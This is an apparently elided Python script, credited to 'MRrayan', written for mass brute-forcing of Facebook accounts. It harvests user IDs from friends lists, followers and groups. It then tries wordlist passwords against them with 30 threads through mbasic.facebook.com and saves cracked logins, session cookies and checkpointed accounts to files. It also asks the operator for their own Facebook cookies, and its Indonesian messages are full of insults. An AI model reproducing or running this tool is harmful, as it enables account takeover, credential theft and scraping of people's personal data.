...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mMRrayan')
...
def banner():
	print(f'''\t{asu} ______                                              
	          🄼🅁🅁🄰🅈🄰🄽
              🄿🅁🄴🄼🄸🅄🄼
	               {m}•{k}•{h}•{sir}Author : MRrayan {x}{m}•{k}•{h}•{x}''')
	               {m}•{k}•{h}•{sir}Whatsapp : https://wa.me/+19724188800 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Masukan[green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies Fb Bapak Loo Awokawaok :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya Yg Tadi!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LOO SONO GOBLOK!!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies Kadaluarsa Tolol Ambil Ulang ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'github.com/Rayan-Senpai'
	...
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____MRrayan_____ = input('\n>> Pilih : ')
	if _____MRrayan_____ in ['1']:
		dump_massal()
	elif _____MRrayan_____ in ['2']:
		dump_follower()
	elif _____MRrayan_____ in ['3']:
		grup()
	elif _____MRrayan_____ in ['4']:
		crack_file()
	elif _____MRrayan_____ in ['5']:
		result()
		...
		print('>> Pilih Yang Bener Lah Kontol ')
		back()
def error():
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Pilih Yang Bener Kontol Goblok ')
				back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Tolol ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruf Bego Luh Ya ')
		exit()
	if jum<1 or jum>100:
	...
	for userr in uid:
		try:
			...
			print('>> Sinyal Loh Kek Kontol Goblok ')
			exit()
	try:
		print('')
		...
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol Goblok ')
		back()
	except (KeyError,IOError):
...
def dump_pengikut():
	try:
		...
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Akun Loo ')
	...
	try:
		...
		print('>> Sinyal Loo Kayak Kntl Goblok ')
		exit()
	except (KeyError,IOError):
...
def grup():
	...
	try:
		...
		print('>> Sinyal Loo Kek Kontol Goblok ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(" Terkena Limit Mampus, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		grup()
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Sabar Kntl Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/MRrayan-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/MRrayan-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/MRrayan-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti Kntl ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Follow Fb Mimin Jangan Lupa {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngntd, Jangan Ngeluh Terus Mmk[cyan] ✓[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Good Bye Kntl JANGAN LUPA FOLLOW FB MRrayan{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/MRrayan-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MRrayan-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			print('')
			li = '# KONEKSI INTERNET BERMASALAH NGNTOD, PERIKSA & COBA LAGI'
